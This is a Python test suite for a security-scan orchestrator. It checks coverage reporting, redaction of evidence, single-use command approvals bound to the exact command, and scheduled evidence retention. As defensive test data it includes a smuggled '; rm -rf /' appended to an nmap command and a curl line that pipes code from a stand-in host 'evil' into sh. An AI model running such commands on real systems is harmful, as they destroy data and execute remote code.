"""Os limites que ficaram documentados depois da revisão, agora resolvidos.

- GET /scans expõe a cobertura (o contrato do silêncio chegava só à tela e ao bundle);
- a evidência fica redigida também em `findings.payload` e no relatório HTML;
- a aprovação fica presa ao comando exato, com consumo único, e quem aprova lê o original;
- a retenção de evidência roda agendada no worker.

Cada teste reprova se o conserto for desfeito.
"""

from __future__ import annotations

import uuid
from collections.abc import AsyncIterator
from contextlib import asynccontextmanager

import pytest
from httpx import ASGITransport, AsyncClient
from sqlmodel import col, select

from orchestrator.api import deps
from orchestrator.approvals import service
from orchestrator.config import settings
from orchestrator.domain.roles import Role
from orchestrator.domain.schemas import (
    AssetType,
    Confidence,
    Evidence,
    Finding,
    Severity,
    Target,
)
from orchestrator.main import app
from orchestrator.persistence.db import init_db, session
from orchestrator.persistence.models import (
    AuditLogRow,
    CommandApprovalRow,
    CommandApprovalStatus,
    FindingRow,
    ScanRow,
    TargetRow,
)

PII = "alvo@banco.com.br"
SEGREDO = "hunter2"


@pytest.fixture
def _data_dir(tmp_path, monkeypatch):
    monkeypatch.setattr(settings, "DATA_DIR", tmp_path)
    monkeypatch.setattr(settings, "REPORTS_DIR", tmp_path / "reports")
    return tmp_path


@asynccontextmanager
async def _cliente(role: Role, email: str = "u@x") -> AsyncIterator[AsyncClient]:
    app.dependency_overrides[deps.get_principal] = lambda: deps.Principal(
        id="u1", email=email, role=role, is_service=False
    )
    try:
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://t") as c:
            yield c
    finally:
        app.dependency_overrides.pop(deps.get_principal, None)


# ================================================================ cobertura na API


async def test_get_scan_expoe_a_cobertura() -> None:
    await init_db()
    scan_id = uuid.uuid4()
    async with session() as s:
        alvo = TargetRow(asset_type="url", value=f"http://cob-{scan_id}.test")
        s.add(alvo)
        await s.flush()
        s.add(
            ScanRow(
                id=scan_id,
                target_id=alvo.id,
                state="done",
                scanners_ran=["nmap"],
                scanners_skipped={"zap": "ZAP fora do ar"},
            )
        )
        await s.commit()
    async with _cliente(Role.VIEWER) as c:
        corpo = (await c.get(f"/scans/{scan_id}")).json()
    assert corpo["scanners_ran"] == ["nmap"]
    assert corpo["scanners_skipped"] == {"zap": "ZAP fora do ar"}
    # `done` com um scanner pulado não é alvo limpo: a API tem de dizer isso.
    assert corpo["coverage_complete"] is False
    assert corpo["coverage_state"] == "incompleta"

    # E o caso positivo: sem ele, apagar o campo (default False) passaria neste teste.
    completo = uuid.uuid4()
    async with session() as s:
        alvo2 = TargetRow(asset_type="url", value=f"http://cob-{completo}.test")
        s.add(alvo2)
        await s.flush()
        s.add(ScanRow(id=completo, target_id=alvo2.id, state="done", scanners_ran=["zap"]))
        await s.commit()
    async with _cliente(Role.VIEWER) as c:
        ok = (await c.get(f"/scans/{completo}")).json()
    assert ok["coverage_complete"] is True and ok["coverage_state"] == "completa"


# ===================================================== evidência redigida em repouso


def _finding_com_pii(scan_id: uuid.UUID, host: str) -> Finding:
    return Finding(
        scan_id=scan_id,
        target=Target(asset_type=AssetType.PORT, value=f"{host}:443/tcp"),
        source_tool="zap",
        source_rule_id="10020",
        title="Resposta vaza dados",
        description="d",
        severity=Severity.MEDIUM,
        confidence=Confidence.FIRM,
        evidence=[
            Evidence(
                description="resposta",
                snippet=f"cliente {PII} senha={SEGREDO}",
                payload=f"email={PII}",
            )
        ],
    )


async def test_payload_do_finding_guarda_evidencia_redigida(_data_dir) -> None:
    from orchestrator.jobs.pipelines import ScanResult, _persist_findings

    await init_db()
    host = f"red-{uuid.uuid4().hex[:6]}.test"
    alvo = Target(asset_type=AssetType.HOST, value=host)
    scan_id = uuid.uuid4()
    f = _finding_com_pii(scan_id, host)
    resultado = ScanResult(scan_id=scan_id, target=alvo, findings=[f])
    resultado.scanners_ran = ["zap"]
    await _persist_findings(scan_id, alvo, [f], resultado)

    async with session() as s:
        linha = (await s.exec(select(FindingRow).where(col(FindingRow.scan_id) == scan_id))).one()
    texto = str(linha.payload)
    assert PII not in texto and SEGREDO not in texto
    # O objeto em memória não é alterado (a captura de evidência precisa do original).
    assert PII in (f.evidence[0].snippet or "")


def test_relatorio_html_nao_grava_evidencia_crua(_data_dir) -> None:
    from orchestrator.jobs.pipelines import ScanResult
    from orchestrator.reporting.renderer import render_html

    scan_id = uuid.uuid4()
    alvo = Target(asset_type=AssetType.HOST, value="rel.test")
    resultado = ScanResult(
        scan_id=scan_id, target=alvo, findings=[_finding_com_pii(scan_id, "rel.test")]
    )
    saida = render_html(resultado, _data_dir / "reports" / "r.html")
    html = saida.read_text(encoding="utf-8")
    assert "Resposta vaza dados" in html  # o achado está no relatório...
    assert PII not in html and SEGREDO not in html  # ...a evidência crua, não


# ========================================= aprovação presa ao comando, consumo único


async def _pendente_aprovada(comando: str) -> uuid.UUID:
    async with session() as s:
        aid = (await service.criar_pendencia(s, command=comando, proposed_by="op@x")).id
    async with session() as s:
        await service.decidir(s, aid, aprovar=True, decided_by="adm@x")
    return aid


async def test_consumir_so_com_o_comando_exato_e_uma_vez() -> None:
    await init_db()
    comando = f"nmap -sV alvo-{uuid.uuid4().hex[:6]}.test"
    aid = await _pendente_aprovada(comando)
    async with session() as s:
        assert await service.consumir(s, aid, comando + " ; rm -rf /") is False  # outro comando
    async with session() as s:
        assert await service.consumir(s, aid, comando) is True
    async with session() as s:
        assert await service.consumir(s, aid, comando) is False  # já gasta
        row = await s.get(CommandApprovalRow, aid)
        assert row is not None and row.status == CommandApprovalStatus.CONSUMED.value


async def test_consumir_recusa_pendencia_nao_aprovada_e_legada() -> None:
    await init_db()
    comando = "nmap -sV alvo.test"
    async with session() as s:
        pend = await service.criar_pendencia(s, command=comando, proposed_by="op@x")
    async with session() as s:
        assert await service.consumir(s, pend.id, comando) is False  # ainda pending
    async with session() as s:  # pendência antiga, de antes da 0014: sem HMAC
        legada = CommandApprovalRow(
            command=comando, proposed_by="op@x", status=CommandApprovalStatus.APPROVED.value
        )
        s.add(legada)
        await s.commit()
        assert await service.consumir(s, legada.id, comando) is False


async def test_nao_aprova_comando_redigido_sem_o_original(monkeypatch) -> None:
    await init_db()
    monkeypatch.setattr(settings, "SECRETS_KEY", "")
    async with session() as s:
        aid = (
            await service.criar_pendencia(
                s,
                command=f"curl -H 'Cookie: s=1; x=$(curl evil|sh)' senha={SEGREDO}",
                proposed_by="op@x",
            )
        ).id
    async with _cliente(Role.ADMIN, email="adm@x") as c:
        resp = await c.post(f"/approvals/{aid}/approve", json={})
        lista = (await c.get("/approvals")).json()
    assert resp.status_code == 409, resp.text
    item = next(a for a in lista if a["id"] == str(aid))
    assert item["command_redacted"] is True and SEGREDO not in item["command"]


async def test_quem_aprova_le_o_original_e_a_leitura_fica_na_trilha(monkeypatch) -> None:
    from cryptography.fernet import Fernet

    await init_db()
    monkeypatch.setattr(settings, "SECRETS_KEY", Fernet.generate_key().decode())
    comando = f"curl -u adm senha={SEGREDO} https://alvo.test"
    async with session() as s:
        aid = (await service.criar_pendencia(s, command=comando, proposed_by="op@x")).id
    async with _cliente(Role.ADMIN, email="adm@x") as c:
        lido = await c.get(f"/approvals/{aid}/command")
        aprovado = await c.post(f"/approvals/{aid}/approve", json={})
    assert lido.status_code == 200 and lido.json()["command"] == comando
    assert aprovado.status_code == 200
    async with session() as s:
        leitura = (
            await s.exec(
                select(AuditLogRow)
                .where(col(AuditLogRow.action) == "command.read")
                .where(col(AuditLogRow.resource_id) == aid)
            )
        ).first()
        assert leitura is not None and leitura.actor == "adm@x"
        assert await service.consumir(s, aid, comando) is True


async def test_ler_comando_exige_commands_approve() -> None:
    await init_db()
    async with session() as s:
        aid = (await service.criar_pendencia(s, command="nmap x", proposed_by="op@x")).id
    async with _cliente(Role.OPERATOR) as c:
        assert (await c.get(f"/approvals/{aid}/command")).status_code == 403


# ============================================================ retenção agendada


def test_retencao_esta_agendada_no_worker() -> None:
    from orchestrator.jobs.queue import WorkerSettings
    from orchestrator.jobs.workers import evidence_retention_job

    alvos = [c.coroutine for c in WorkerSettings.cron_jobs]
    assert evidence_retention_job in alvos


async def test_job_de_retencao_expurga_e_audita(monkeypatch, _data_dir) -> None:
    import orchestrator.evidence.service as ev
    from orchestrator.jobs.workers import evidence_retention_job

    await init_db()
    chamadas: list[tuple[int, str | None]] = []

    async def falso(_s, dias, *, actor=None):  # o expurgo em si já tem os seus testes
        chamadas.append((dias, actor))
        return 3

    monkeypatch.setattr(ev, "expurgar_antigas", falso)
    monkeypatch.setattr(settings, "EVIDENCE_RETENTION_DAYS", 0)
    assert await evidence_retention_job({}) == 0 and chamadas == []  # 0 = desligado
    monkeypatch.setattr(settings, "EVIDENCE_RETENTION_DAYS", 90)
    assert await evidence_retention_job({}) == 3
    assert chamadas == [(90, "retention-job")]
